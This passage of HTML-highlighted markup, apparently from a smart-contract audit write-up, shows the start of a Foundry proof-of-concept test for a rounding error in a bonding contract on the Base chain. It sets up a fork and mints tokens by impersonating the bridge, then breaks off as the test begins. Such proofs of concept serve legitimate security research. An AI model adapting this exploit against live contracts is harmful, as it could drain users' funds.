class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ticker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edesc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epurchaseAmount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBondingRoundingPOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4200000000000000000000000000000000000010\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xF66DeA7b3e897cD44A5a231c61B6B4423d613259\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;alice\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;bob\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echarlie\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;charlie\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e45000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_519_750\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_rounding_error_upon_graduate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan 